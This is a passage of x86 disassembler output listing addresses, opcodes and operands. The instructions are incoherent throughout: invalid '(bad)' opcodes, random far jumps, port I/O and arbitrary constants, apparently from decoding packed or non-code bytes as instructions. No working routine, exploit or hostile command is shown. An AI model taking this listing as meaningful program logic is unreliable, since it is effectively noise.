  41f4fe:	pop    ecx
  41f4ff:	out    0x41,eax
  41f501:	mov    ds:0xd4a484f1,eax
  41f506:	rcr    DWORD PTR [ecx],0x56
  41f509:	rcr    DWORD PTR [edi+0x40928375],0x92
  41f510:	enter  0xee2f,0xce
  41f514:	cdq    
  41f515:	enter  0xa6fb,0xe5
  41f519:	xchg   edx,eax
  41f51a:	dec    ebp
  41f51b:	push   es
  41f51c:	inc    eax
  41f51d:	sub    bl,BYTE PTR [esi]
  41f51f:	sub    DWORD PTR [edx+0x6b],edx
  41f522:	(bad)  
  41f524:	dec    edx
  41f525:	xor    ebp,edx
  41f527:	jb     0x41f4e3
  41f529:	jmp    0xa217:0x165a76de
  41f530:	xor    eax,0x9d0dd418
  41f535:	into   
  41f536:	sbb    ah,cl
  41f538:	mov    eax,0x9135441f
  41f53d:	push   ecx
  41f53e:	sahf   
  41f53f:	mov    ecx,0x9b3d520
  41f544:	aas    
  41f545:	scas   al,BYTE PTR es:[edi]
  41f546:	inc    BYTE PTR [edi]
  41f548:	shr    DWORD PTR [ecx],0x1c
  41f54b:	pop    ebp
  41f54c:	mov    esi,0xd5b1eac5
  41f551:	fs xabort 0x68
  41f555:	cmp    cl,0x24
  41f558:	mov    bl,0x1d
  41f55a:	mov    ebx,0x42b762cc
  41f55f:	xchg   edi,eax
  41f560:	xor    al,0x1
  41f562:	sub    DWORD PTR [edx],edi
  41f564:	loope  0x41f5d9
  41f566:	xor    BYTE PTR [edi],0x86
  41f569:	dec    esi
  41f56a:	neg    DWORD PTR [esi+0x2b5cfae8]
  41f570:	sbb    dl,BYTE PTR [ecx-0xd5b82ea]
  41f576:	jmp    0x9a26:0xc24728fb
  41f57d:	cmc    
  41f57e:	jmp    0x41f513
  41f580:	jg     0x41f5ad
  41f582:	sbb    BYTE PTR [ebp-0x59],bl
  41f585:	stos   DWORD PTR es:[edi],eax
  41f586:	nop
  41f587:	xchg   ebx,eax
  41f588:	push   es
  41f589:	jo     0x41f5b4
  41f58b:	pop    ebx
  41f58c:	les    eax,FWORD PTR [ebp-0x4446ecfe]
  41f592:	jb     0x41f518
  41f594:	popf   
  41f595:	add    BYTE PTR [ebp-0x6f],0x25
  41f599:	(bad)  
  41f59a:	rol    edi,0x40
  41f59d:	lds    edi,FWORD PTR [esi]
  41f59f:	sub    BYTE PTR [edi-0x2c],ah
  41f5a2:	push   esi
  41f5a3:	push   ebp
  41f5a4:	fcomp  DWORD PTR [esi+0x69]
  41f5a7:	aaa    
  41f5a8:	xor    ebp,DWORD PTR [ebx+0x3e]
  41f5ab:	dec    ebx
  41f5ac:	stos   BYTE PTR es:[edi],al
  41f5ad:	jo     0x640cd54d
  41f5b3:	enter  0xc55a,0xe7
  41f5b7:	sub    ebx,DWORD PTR [ebx]
  41f5b9:	imul   ecx,ebp,0xffffffaa
  41f5bc:	in     eax,dx
  41f5bd:	mov    edx,0x7b2d7333
  41f5c2:	xor    DWORD PTR [esi-0x41],ebx
  41f5c5:	mov    esi,0xa33d43bd
  41f5ca:	jmp    0x42a4:0x621d413
  41f5d1:	test   eax,0x57c2c884
  41f5d7:	dec    esi
  41f5d8:	jbe    0x41f5e1
  41f5da:	retf   
  41f5db:	sbb    eax,0xe58e149c
  41f5e0:	outs   dx,BYTE PTR ds:[esi]
  41f5e1:	mov    esp,0xa67be273
  41f5e6:	add    bl,al
  41f5e8:	push   ds
  41f5e9:	lock je 0x41f5cc
  41f5ec:	in     al,0x82
  41f5ee:	dec    ebp
  41f5ef:	int3   
  41f5f0:	inc    ebp
  41f5f1:	or     BYTE PTR [eax+0x13],0xcb
  41f5f5:	inc    esp
  41f5f6:	push   cs
  41f5f7:	rcl    cl,1
  41f5f9:	out    0x6d,eax
  41f5fb:	xor    DWORD PTR [ecx],ebp
  41f5fd:	leave  
  41f5fe:	xchg   esp,eax
  41f5ff:	lods   eax,DWORD PTR ds:[esi]
  41f600:	pop    ebx
  41f601:	xchg   esp,eax
  41f602:	shr    DWORD PTR ds:0x722d0cde,0xc4
  41f609:	xchg   esi,eax
  41f60a:	imul   edi,DWORD PTR [ecx],0xd7a384b1
  41f610:	push   es
  41f611:	sub    bp,WORD PTR [esi+0x31]
  41f615:	inc    eax
  41f616:	cmp    eax,0x4203ba95
  41f61b:	jmp    FWORD PTR [edx+0x3297f0f2]
  41f621:	imul   edi,DWORD PTR [esi-0x52a6a330],0x3e
  41f628:	and    BYTE PTR [edi],ch
  41f62a:	es out dx,ax
  41f62d:	cmp    al,0x4c
  41f62f:	and    eax,0x1b9e8778
  41f634:	iret   
  41f635:	in     al,0x80
  41f637:	xchg   esp,eax
  41f638:	iret   
  41f639:	jnp    0x41f686
  41f63b:	xor    BYTE PTR [ecx-0x69363fa3],ah
  41f641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f642:	mov    edx,0x2cf9cef5
  41f647:	jmp    0x41f5f6
  41f649:	cdq    
  41f64a:	je     0x41f6b8
  41f64c:	bsr    ebp,DWORD PTR [ecx+0x73]
  41f650:	cmc    
  41f651:	or     DWORD PTR ds:0x9f45988c,ebp
  41f657:	repnz arpl WORD PTR [eax-0x1d],dx
  41f65b:	test   BYTE PTR [ecx+ebx*2-0x5f],0x93
  41f660:	inc    edi
  41f661:	push   edi
  41f662:	jl     0x41f6b1
  41f664:	pop    esi
  41f665:	es call 0x13539ca7
  41f66b:	xor    BYTE PTR [ebx+0x3d],al
  41f66e:	imul   esp,DWORD PTR [edi],0xffffffdd
  41f671:	inc    edi
  41f672:	out    0x78,eax
  41f674:	push   ecx
  41f675:	mov    ecx,0xe9ee5515
  41f67a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f67b:	or     eax,0x1f17f091
  41f680:	dec    esi
  41f681:	sbb    al,0xad
  41f683:	cmp    ah,BYTE PTR [edi-0x6982e938]
  41f689:	icebp  
  41f68a:	fnstenv [ebp+eax*1+0x55179d99]
  41f691:	ss dec ecx
  41f693:	scas   eax,DWORD PTR es:[edi]
  41f694:	xchg   edx,eax
  41f695:	mov    ds,WORD PTR [eax+ebp*4-0x54]
  41f699:	push   edx
  41f69a:	and    DWORD PTR [edi+0x376e1ffd],ebx
  41f6a0:	lea    esp,[eax-0x71e38163]
  41f6a6:	sub    DWORD PTR [esi+0x25],ecx
  41f6a9:	inc    esp
  41f6aa:	xchg   ch,bh
  41f6ac:	(bad)  
  41f6ad:	in     eax,0x2d
  41f6af:	xchg   ebx,eax
  41f6b0:	das    
  41f6b1:	test   DWORD PTR [edx+0x74771ad8],0x913b5a86
  41f6bb:	sbb    bh,0x9c
  41f6be:	mov    dh,dl
  41f6c0:	sub    DWORD PTR ds:0x63fa81f,esi
  41f6c6:	and    ah,BYTE PTR [esi]
  41f6c8:	pop    ds
  41f6c9:	xor    BYTE PTR [edi],dh
  41f6cb:	xor    edx,ebp
  41f6cd:	cmp    eax,esp
  41f6cf:	mov    ebx,DWORD PTR [ebp-0x52]
  41f6d2:	andps  xmm7,XMMWORD PTR [ebx]
  41f6d5:	repz in eax,0x85
  41f6d8:	and    DWORD PTR [ebx-0x422d513d],edi
  41f6de:	stos   BYTE PTR es:[edi],al
  41f6df:	jne    0x41f6c8
  41f6e1:	mov    eax,0xfcca5686
  41f6e6:	and    BYTE PTR [eax+0x1d],bl
  41f6e9:	arpl   WORD PTR [esi-0x7ba3aee6],sp
  41f6ef:	push   eax
  41f6f0:	scas   al,BYTE PTR es:[edi]
  41f6f1:	jnp    0x41f75d
  41f6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6f4:	cli    
  41f6f5:	inc    ebp
  41f6f6:	gs inc esi
  41f6f8:	pop    ebx
  41f6f9:	sbb    ebp,DWORD PTR [eax]
  41f6fb:	ins    BYTE PTR es:[edi],dx
  41f6fc:	ret    
  41f6fd:	cmp    ch,BYTE PTR [ecx-0x7e03250c]
  41f703:	lods   al,BYTE PTR ds:[esi]
  41f704:	aad    0xbd
  41f706:	(bad)
  41f709:	imul   edi,DWORD PTR ds:0xd6008d1f,0xffffffb0
  41f710:	sub    DWORD PTR [edx+0x26],0xd8d14f2b
  41f717:	gs dec eax
  41f719:	mov    WORD PTR ss:[ebx+0x10],gs
  41f71d:	add    ebx,edx
  41f71f:	div    DWORD PTR ds:0x2c297e17
  41f725:	jmp    0x1fd24552
  41f72a:	cld    
  41f72b:	stc    
  41f72c:	inc    esi
  41f72d:	pop    edx
  41f72e:	call   0xeafa1609
  41f733:	gs and bh,ch
  41f736:	mov    ecx,0xeab37599
  41f73b:	xor    edi,DWORD PTR [ebp+0x52b8807f]
  41f741:	jnp    0x41f72a
  41f743:	jle    0x41f6d0
  41f745:	dec    ebp
  41f746:	mov    ss,WORD PTR [edi+ebx*1]
  41f749:	xchg   esp,eax
  41f74a:	(bad)  
  41f74b:	shl    DWORD PTR [ebx-0x76],cl
  41f74e:	adc    al,0x6c
  41f750:	and    ecx,DWORD PTR ds:0x9a5afae5
  41f756:	mov    BYTE PTR [esi],ah
  41f758:	popf   
  41f759:	into   
  41f75a:	push   edx
  41f75b:	xchg   ecx,eax
  41f75c:	jecxz  0x41f7be
  41f75e:	inc    esp
  41f75f:	sbb    bl,BYTE PTR [eax+0x4c]
  41f762:	pop    ebp
  41f763:	cmc    
  41f764:	push   edx
  41f765:	sbb    eax,0xb763af6b
  41f76a:	dec    edi
  41f76b:	or     al,0x14
  41f76d:	mov    al,ds:0xc801219c
  41f772:	add    ch,BYTE PTR [edi+0x7b]
  41f775:	pop    ebx
  41f776:	jne    0x41f7c8
  41f778:	jle    0x41f744
  41f77a:	add    al,0xc1
  41f77c:	adc    BYTE PTR [edi+0x7f9b4dbe],al
  41f782:	push   edi
  41f783:	xchg   edi,eax
  41f784:	mov    al,0x61
  41f786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f787:	fwait
  41f788:	add    eax,0x877bd3ad
  41f78d:	test   eax,edi
  41f78f:	gs push 0x864bd91b
  41f795:	dec    eax
  41f796:	nop
  41f797:	jnp    0x41f78d
  41f799:	js     0x41f7c0
  41f79b:	inc    ebx
  41f79c:	shl    DWORD PTR [edx],0xa0
  41f79f:	addr16 out dx,al
  41f7a1:	popf   
  41f7a2:	ja     0x41f7e7
  41f7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7a5:	or     BYTE PTR [ecx-0x75233df2],0xa6
  41f7ac:	push   esi
  41f7ad:	pushf  
  41f7ae:	in     al,dx
  41f7af:	push   es
  41f7b0:	imul   ebx,DWORD PTR [ebx+0x41],0xffffffea
  41f7b4:	mov    eax,0x95626ba0
  41f7b9:	fcmovnu st,st(1)
  41f7bb:	xor    ebp,DWORD PTR [edi+0x67]
  41f7be:	pop    ebp
  41f7bf:	stos   BYTE PTR es:[edi],al
  41f7c0:	cmc    
  41f7c1:	retf   
  41f7c2:	stc    
  41f7c3:	shr    ch,cl
  41f7c5:	jle    0x41f76c
  41f7c7:	cmp    edx,DWORD PTR [eax-0x2a6b6a72]
  41f7cd:	or     esp,ecx
  41f7cf:	test   DWORD PTR [ebp+0x52c8970a],ecx
  41f7d5:	arpl   cx,ax
  41f7d7:	adc    DWORD PTR [ecx+0x73],0xffffff88
  41f7db:	gs adc bh,dl
  41f7de:	sub    DWORD PTR [edx],edi
  41f7e0:	imul   DWORD PTR [ebx-0x1c7c56f9]
  41f7e6:	push   edi
  41f7e7:	and    eax,0x11d54c
  41f7ec:	inc    ecx
  41f7ed:	push   edi
  41f7ee:	cwde   
  41f7ef:	and    eax,0x1b792d9d
  41f7f4:	mov    ?,edx
  41f7f6:	ret    
  41f7f7:	pop    ebx
  41f7f8:	pop    eax
  41f7f9:	jae    0x41f78a
  41f7fb:	ret    
  41f7fc:	mov    ah,0x6d
  41f7fe:	sub    DWORD PTR [ebx+ebx*4-0x7aec4f55],0x5ef56868
  41f809:	inc    esi
  41f80a:	nop
  41f80b:	ja     0x41f7e8
  41f80d:	imul   ebx,eax,0x40
  41f810:	sbb    al,BYTE PTR [esi+eax*2+0x12]
  41f814:	and    BYTE PTR [edx+0x5e232a27],0x20
  41f81b:	scas   al,BYTE PTR es:[edi]
  41f81c:	scas   al,BYTE PTR es:[edi]
  41f81d:	dec    ebx
  41f81e:	inc    esp
  41f81f:	push   edi
  41f820:	mov    ch,0x5a
  41f822:	scas   al,BYTE PTR es:[edi]
  41f823:	aas    
  41f824:	cs icebp 
  41f826:	retf   0xd25c
  41f829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f82a:	sti    
  41f82b:	or     DWORD PTR [eax+0x24],eax
  41f82e:	out    0x2e,al
  41f830:	mov    ?,WORD PTR [eax+0x52]
  41f833:	imul   ecx,DWORD PTR [eax-0x2c685803],0xfbe87bac
  41f83d:	push   es
  41f83e:	and    edx,DWORD PTR [edi+0xf6d7a28]
  41f844:	bnd call DWORD PTR [esi]
  41f847:	pop    eax
  41f848:	int    0x59
  41f84a:	xor    bh,ch
  41f84c:	pop    edx
  41f84d:	lahf   
  41f84e:	push   cs
  41f84f:	inc    esp
  41f850:	hlt    
  41f851:	nop    ebx
  41f854:	fucomip st,st(4)
  41f856:	cmp    al,0x51
  41f858:	in     al,dx
  41f859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f85a:	fisttp WORD PTR [edi+0x34]
  41f85d:	aaa    
  41f85e:	mov    gs,WORD PTR [esi+0x2abeddfc]
  41f864:	(bad)  
  41f865:	aad    0xa7
  41f867:	cmp    DWORD PTR ds:0x6550a927,0x3d
  41f86e:	cmp    ebp,edi
  41f870:	loop   0x41f839
  41f872:	mov    bl,BYTE PTR [edx]
  41f874:	(bad)  
  41f875:	xchg   edi,eax
  41f876:	loope  0x41f837
  41f878:	cmp    dh,BYTE PTR [edx+ebx*4-0x50]
  41f87c:	call   0x9585e6aa
  41f881:	pop    ebx
  41f882:	mov    esi,DWORD PTR [eax+0x6f7af61]
  41f888:	push   ecx
  41f889:	inc    ebx
  41f88a:	addr16 test eax,0xb0d5d7dd
  41f890:	xor    ecx,DWORD PTR [ebx]
  41f892:	out    0x7a,eax
  41f894:	push   esi
  41f895:	clc    
  41f896:	sub    esp,edx
  41f898:	pop    ebp
  41f899:	in     al,0x18
  41f89b:	shl    BYTE PTR [ecx+eiz*1+0x2a],1
  41f89f:	scas   eax,DWORD PTR es:[edi]
  41f8a0:	test   eax,0x6711e44f
  41f8a5:	lods   eax,DWORD PTR ds:[esi]
  41f8a6:	push   esp
  41f8a7:	xchg   ecx,eax
  41f8a8:	add    al,0xc9
  41f8aa:	dec    edx
  41f8ab:	aad    0x53
  41f8ad:	test   al,0x86
  41f8af:	test   BYTE PTR es:[edx+0x7d],cl
  41f8b3:	push   0x9141c269
  41f8b8:	leave  
  41f8b9:	inc    edx
  41f8ba:	mov    bh,BYTE PTR [edx-0x60]
  41f8bd:	sub    ah,BYTE PTR [ecx]
  41f8bf:	push   ss
  41f8c0:	xchg   ebp,eax
  41f8c1:	pop    ecx
  41f8c2:	imul   edx,ecx,0x65
  41f8c5:	les    ecx,FWORD PTR [ecx]
  41f8c7:	cmp    eax,0xa1154994
  41f8cc:	addr16 nop
  41f8ce:	jne    0x41f88e
  41f8d0:	ds gs stos BYTE PTR es:[edi],al
  41f8d3:	sbb    ah,BYTE PTR [edx]
  41f8d5:	fwait
  41f8d6:	repnz or al,0x7a
  41f8d9:	rcr    BYTE PTR [esi],0x9d
  41f8dc:	aad    0x8c
  41f8de:	mov    ds:0xf09188f0,al
  41f8e3:	pusha  
  41f8e4:	push   ds
  41f8e5:	ins    BYTE PTR es:[edi],dx
  41f8e6:	xchg   edx,eax
  41f8e7:	jnp    0x41f911
  41f8e9:	jns    0x41f86c
  41f8eb:	lahf   
  41f8ec:	fmul   DWORD PTR [eax-0x8e7197]
  41f8f2:	fmul   st(3),st
  41f8f4:	pop    esi
  41f8f5:	addr16 pop es
  41f8f7:	gs rcr dh,cl
  41f8fa:	xor    al,0x6c
  41f8fc:	stc    
  41f8fd:	sbb    eax,0x3b386498
  41f902:	mov    cl,0xca
  41f904:	cmp    eax,0x5153127b
  41f909:	in     eax,dx
  41f90a:	mov    esi,0xc6e62781
  41f90f:	je     0x41f8cf
  41f911:	adc    DWORD PTR [edi],0xffffff90
  41f914:	pop    ds
  41f915:	cmp    DWORD PTR [ecx],eax
  41f917:	mov    edi,0xf3fc60a2
  41f91c:	push   esp
  41f91d:	and    BYTE PTR [esp+edx*4+0x19c0e206],ch
  41f924:	cld    
  41f925:	jnp    0x41f941
  41f927:	das    
  41f928:	mov    ecx,0xdb9b2ac8
  41f92d:	outs   dx,DWORD PTR ds:[esi]
  41f92e:	mov    bl,0x12
  41f930:	push   ss
  41f931:	shr    BYTE PTR [eax-0x37127c8],cl
  41f937:	rol    DWORD PTR [edi+0x38],0x2e
  41f93b:	mov    bl,0x82
  41f93d:	mov    ch,0x98
  41f93f:	mov    eax,0x35e51917
  41f944:	ja     0x41f90e
  41f946:	or     ch,BYTE PTR [esi-0x51]
  41f949:	or     ebp,DWORD PTR [ebx]
  41f94b:	out    0xac,eax
  41f94d:	out    dx,eax
  41f94e:	test   DWORD PTR [edx+0xd4038fc],ebp
  41f954:	addr16 mov ds:0x45a,al
  41f958:	xchg   BYTE PTR [ebp-0x6e],al
  41f95b:	into   
  41f95c:	mul    DWORD PTR [eax+0x29207427]
  41f962:	dec    edx
  41f963:	mov    eax,0xd544c925
  41f968:	fsubr  st,st(2)
  41f96a:	ror    DWORD PTR [ebx],cl
  41f96c:	in     al,0xb5
  41f96e:	or     eax,0x5390598b
  41f973:	sahf   
  41f974:	stos   DWORD PTR es:[edi],eax
  41f975:	fsub   QWORD PTR [ebx-0x575f5f10]
  41f97b:	sbb    dh,BYTE PTR [ebx]
  41f97d:	pushf  
  41f97e:	cmp    ebx,DWORD PTR [eax]
  41f980:	jb     0x41f941
  41f982:	test   DWORD PTR [edi+eax*2],esi
  41f985:	pop    eax
  41f986:	imul   esi,DWORD PTR [edx+0x39],0xef5d1838
  41f98d:	ins    BYTE PTR es:[edi],dx
  41f98e:	jl     0x41f92f
  41f990:	dec    ebp
  41f991:	cmp    ecx,esp
  41f993:	repz xlat BYTE PTR ds:[ebx]
  41f995:	leave  
  41f996:	cs in  eax,0xcc
  41f999:	and    ebx,DWORD PTR [edi-0x5fad84d3]
  41f99f:	sbb    ecx,DWORD PTR gs:[ebx]
  41f9a2:	scas   al,BYTE PTR es:[edi]
  41f9a3:	push   ds
  41f9a4:	adc    BYTE PTR [edx],0xe7
  41f9a7:	cmp    al,0x95
  41f9a9:	loope  0x41f9bd
  41f9ab:	idiv   DWORD PTR fs:[ecx-0x7b]
  41f9af:	pop    edi
  41f9b0:	mov    edi,0xb86f3378
  41f9b5:	sbb    edx,ebp
  41f9b7:	lds    ebx,FWORD PTR [ecx]
  41f9b9:	aaa    
  41f9ba:	ficom  WORD PTR [ecx+0x45]
  41f9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9be:	pop    edx
  41f9bf:	retf   
  41f9c0:	sbb    esp,DWORD PTR [ebx+0x3a]
  41f9c3:	in     al,0xe0
  41f9c5:	xchg   ecx,eax
  41f9c6:	fsubrp st(3),st
  41f9c8:	dec    ebp
  41f9c9:	xor    al,0x54
  41f9cb:	cmp    DWORD PTR [edx-0x7a],ebp
  41f9ce:	mov    BYTE PTR [eax+0x7f],bl
  41f9d1:	add    esi,DWORD PTR [ebp+0x0]
  41f9d4:	or     al,0xc
  41f9d6:	adc    eax,0x4bd813bd
  41f9db:	or     al,0x50
  41f9dd:	fcmovu st,st(6)
  41f9df:	icebp  
  41f9e0:	adc    DWORD PTR [esi-0x22],ebp
  41f9e3:	adc    DWORD PTR [eax-0x30],ebx
  41f9e6:	jo     0x41fa49
  41f9e8:	frstor [eax-0x1fa9a191]
  41f9ee:	stos   BYTE PTR es:[edi],al
  41f9ef:	or     bh,al
  41f9f1:	sbb    eax,DWORD PTR [ebp-0x7428a7d8]
  41f9f7:	dec    edi
  41f9f8:	leave  
  41f9f9:	ss mov cl,bl
  41f9fc:	jne    0x41fa17
  41f9fe:	xor    ecx,edx
  41fa00:	mov    esp,0x5370c7f
  41fa05:	mov    eax,0x31f2b886
  41fa0a:	test   eax,0x4a335be6
  41fa0f:	fs stos DWORD PTR es:[edi],eax
  41fa11:	popa   
  41fa12:	ficom  WORD PTR [esi+0x6f]
  41fa15:	mov    ds:0xd19e161,al
  41fa1a:	pop    edi
  41fa1b:	xchg   DWORD PTR [ebp+ecx*1-0x2b],eax
  41fa1f:	jl     0x41fa4b
  41fa21:	sub    ecx,DWORD PTR [ebx-0xa27508d]
  41fa27:	dec    edi
  41fa28:	pop    ds
  41fa29:	idiv   DWORD PTR [ebp-0x48de9993]
  41fa2f:	scas   al,BYTE PTR es:[edi]
  41fa30:	mov    esp,0x5da6767a
  41fa35:	inc    DWORD PTR [ecx+0x6725697e]
  41fa3b:	push   ss
  41fa3c:	aam    0x50
  41fa3e:	fst    DWORD PTR [eax]
  41fa40:	aaa    
  41fa41:	ins    DWORD PTR es:[edi],dx
  41fa42:	xchg   ebp,eax
  41fa43:	popf   
  41fa44:	sub    eax,0xcb9a9f3b
  41fa49:	mov    ebp,0xcee4b20b
  41fa4e:	hlt    
  41fa4f:	test   DWORD PTR [ebx],eax
  41fa51:	idiv   DWORD PTR [eax+0x50]
  41fa54:	sbb    eax,0x21c47833
  41fa59:	rcr    ecx,cl
  41fa5b:	mov    cl,0x5d
  41fa5d:	fsub   st(1),st
  41fa5f:	lods   al,BYTE PTR ds:[esi]
  41fa60:	loopne 0x41fa8d
  41fa62:	shl    DWORD PTR [edx-0x2b],cl
  41fa65:	in     eax,0x3b
  41fa67:	jmp    0x41faad
  41fa69:	(bad)  
  41fa6a:	retf   
  41fa6b:	jecxz  0x41faa1
  41fa6d:	mov    edi,0x31d7046b
  41fa72:	sub    eax,0x99d27681
  41fa77:	cmp    al,0x11
  41fa79:	push   es
  41fa7a:	shr    DWORD PTR [edx-0x53d8cfe9],cl
  41fa80:	mov    cl,0x32
  41fa82:	pop    edi
  41fa83:	xor    eax,0x98def904
  41fa88:	mov    dh,ch
  41fa8a:	mov    edx,0xd0f3e96e
  41fa8f:	imul   eax,DWORD PTR [ebx+edi*2+0x5f],0x7b
  41fa94:	pop    ss
  41fa95:	out    dx,eax
  41fa96:	mov    WORD PTR [ebx-0x538531ea],gs
  41fa9c:	push   ss
  41fa9d:	call   0xa4c46504
  41faa2:	lods   eax,DWORD PTR ds:[esi]
  41faa3:	aas    
  41faa4:	mov    DWORD PTR [edx+0x4c],esp
  41faa7:	jmp    DWORD PTR [edx+0x1d]
  41faaa:	fwait
  41faab:	cdq    
  41faac:	xchg   esp,eax
  41faad:	sbb    bl,bh
  41faaf:	mov    al,ds:0xba5a74c0
  41fab4:	cmp    DWORD PTR [edi-0xf],0xf209a8e0
  41fabb:	stos   BYTE PTR es:[edi],al
  41fabc:	les    ebp,FWORD PTR [edi+0x25]
  41fabf:	jmp    0x8d68:0x50880648
  41fac6:	fadd   QWORD PTR [esi+0x48]
  41fac9:	mov    bl,0xae
  41facb:	int    0x53
  41facd:	or     DWORD PTR [esi+0x51576bab],esp
  41fad3:	jae    0x41faee
  41fad5:	lds    ebx,FWORD PTR [ecx+0x7a381132]
  41fadb:	ret    
  41fadc:	gs mov eax,0x2855be69
  41fae2:	lods   al,BYTE PTR ds:[esi]
  41fae3:	loop   0x41fab3
  41fae5:	ja     0x41fab3
  41fae7:	and    ebx,DWORD PTR [esi+0x5d]
  41faea:	sub    eax,0xc393af46
  41faef:	imul   ebx,DWORD PTR [ecx],0x585c9466
  41faf5:	inc    eax
  41faf6:	hlt    
  41faf7:	rcl    BYTE PTR [eax-0x33],1
  41fafa:	push   cs
  41fafb:	jg     0x41fb09
  41fafd:	in     al,0x94
  41faff:	jecxz  0x41fb0d
  41fb01:	shl    ecx,cl
  41fb03:	in     eax,dx
  41fb04:	push   es
  41fb05:	sets   BYTE PTR [ecx+0x12426350]
  41fb0c:	jb     0x41fb3f
  41fb0e:	in     eax,dx
  41fb0f:	test   ebp,eax
  41fb11:	inc    ecx
  41fb12:	sbb    DWORD PTR [ebx-0x7f0eb43c],ebp
  41fb18:	sub    DWORD PTR [edi+0x536a6aa4],ecx
  41fb1e:	mov    edi,0xb68e6fa3
  41fb23:	inc    esp
  41fb24:	fst    DWORD PTR [edx]
  41fb26:	test   eax,0xaa0d658b
  41fb2b:	(bad)  [edx]
  41fb2d:	pop    ds
  41fb2e:	add    dl,BYTE PTR [esi-0x16]
  41fb31:	push   eax
  41fb32:	sahf   
  41fb33:	aad    0x90
  41fb35:	scas   eax,DWORD PTR es:[edi]
  41fb36:	adc    DWORD PTR [ecx],0x6a6ba323
  41fb3c:	lahf   
  41fb3d:	mov    edx,0x9bd6d5e2
  41fb42:	mov    ebp,0x6c194909
  41fb47:	xor    BYTE PTR [eax-0x2b],ch
  41fb4a:	dec    edi
  41fb4b:	cs pop esi
  41fb4d:	jecxz  0x41fb89
  41fb4f:	in     al,dx
  41fb50:	mov    bl,0x1
  41fb52:	push   es
  41fb53:	inc    ebp
  41fb54:	add    eax,0x71b8d41b
  41fb59:	mov    BYTE PTR ds:0xc8099c0e,cl
  41fb5f:	jmp    0x53ca744f
  41fb64:	push   ebp
  41fb65:	sbb    bh,0x2c
  41fb68:	xor    BYTE PTR [edx+0x2e819980],cl
  41fb6e:	outs   dx,BYTE PTR ds:[esi]
  41fb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb70:	outs   dx,BYTE PTR ds:[esi]
  41fb71:	mov    dl,0xdc
  41fb73:	sbb    al,0x83
  41fb75:	xchg   ebp,eax
  41fb76:	sub    dl,dl
  41fb78:	(bad)  
  41fb79:	fidiv  WORD PTR ds:0xd249d7b4
  41fb7f:	mov    ds:0xdb440870,al
  41fb84:	add    eax,0x1ba6622a
  41fb89:	xlat   BYTE PTR ds:[ebx]
  41fb8a:	fisttp DWORD PTR [edx-0x30]
  41fb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb8e:	jmp    0x41fb7a
  41fb90:	cmp    ebx,DWORD PTR [esi+0x560f2347]
  41fb96:	push   ecx
  41fb97:	enter  0xe7ba,0xf
  41fb9b:	lock jge 0x41fbb0
  41fb9e:	xchg   ch,ch
  41fba0:	sti    
  41fba1:	mov    ds:0x7796c0b5,al
  41fba6:	jge    0x41fbd6
  41fba8:	push   ds
  41fba9:	push   esi
  41fbaa:	in     al,0xf8
  41fbac:	int    0xd4
  41fbae:	dec    esi
  41fbaf:	fisub  WORD PTR [edx-0x56]
  41fbb2:	cmp    eax,0x2be81f47
  41fbb7:	aaa    
  41fbb8:	enter  0x2a4d,0xcd
  41fbbc:	xor    al,0x3e
  41fbbe:	gs pushf 
  41fbc0:	test   DWORD PTR [ecx-0x497cd35e],ecx
  41fbc6:	jb     0x41fc2d
  41fbc8:	in     al,dx
  41fbc9:	mov    dh,ah
  41fbcb:	or     DWORD PTR ss:[ecx-0x4f],esp
  41fbcf:	fwait
  41fbd0:	test   BYTE PTR es:[ecx],0x7b
  41fbd4:	ret    0x736b
  41fbd7:	xchg   BYTE PTR [edx+ebx*2-0xc9f119f],bl
  41fbde:	add    esi,ecx
  41fbe0:	stos   BYTE PTR es:[edi],al
  41fbe1:	fidiv  DWORD PTR [esi]
  41fbe3:	pop    ecx
  41fbe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbe5:	lock outs dx,DWORD PTR ds:[esi]
  41fbe7:	test   eax,0xdce00cec
  41fbec:	jo     0x41fb8d
  41fbee:	mov    ebx,DWORD PTR [edi]
  41fbf0:	lods   eax,DWORD PTR ds:[esi]
  41fbf1:	inc    edx
  41fbf2:	push   esp
  41fbf3:	dec    eax
  41fbf4:	inc    esp
  41fbf5:	pop    esp
  41fbf6:	popa   
  41fbf7:	in     al,0xa0
  41fbf9:	pop    esp
  41fbfa:	stos   BYTE PTR es:[edi],al
  41fbfb:	mov    dl,0x28
  41fbfd:	mov    BYTE PTR [edx-0x7cbeea60],ah
  41fc03:	or     ebx,DWORD PTR [edx-0x680e4960]
  41fc09:	addr16 mov edx,0xdf4f6c76
  41fc0f:	mov    al,ds:0xf19f5915
  41fc14:	ins    BYTE PTR es:[edi],dx
  41fc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc16:	(bad)  
  41fc17:	mov    ah,0x22
  41fc19:	addr16 inc esi
  41fc1b:	les    esp,FWORD PTR [ecx+0x68]
  41fc1e:	sti    
  41fc1f:	inc    ebx
  41fc20:	gs int3 
  41fc22:	mov    ds:0x2ee3b5fc,eax
  41fc27:	push   esp
  41fc28:	ret    
  41fc29:	gs push 0x7342f3e3
  41fc2f:	jg     0x41fc63
  41fc31:	and    eax,0xf1ea6f12
  41fc36:	rcr    BYTE PTR [esi],1
  41fc38:	retf   0x1cba
  41fc3b:	imul   DWORD PTR [edi+edi*2+0x5537fcc2]
  41fc42:	ja     0x41fc9f
  41fc44:	sub    bh,BYTE PTR [edi]
  41fc46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc47:	lock lds ebp,FWORD PTR [ecx-0x15ecca73]
  41fc4e:	pop    ss
  41fc4f:	jecxz  0x41fc8c
  41fc51:	out    0x2,al
  41fc53:	mov    ah,dh
  41fc55:	dec    ecx
  41fc56:	mov    esi,ecx
  41fc58:	xchg   ebp,eax
  41fc59:	daa    
  41fc5a:	retf   0xf220
  41fc5d:	leave  
  41fc5e:	cmp    al,0x7d
  41fc60:	loop   0x41fbf5
  41fc62:	lods   al,BYTE PTR ds:[esi]
  41fc63:	mov    cl,0x18
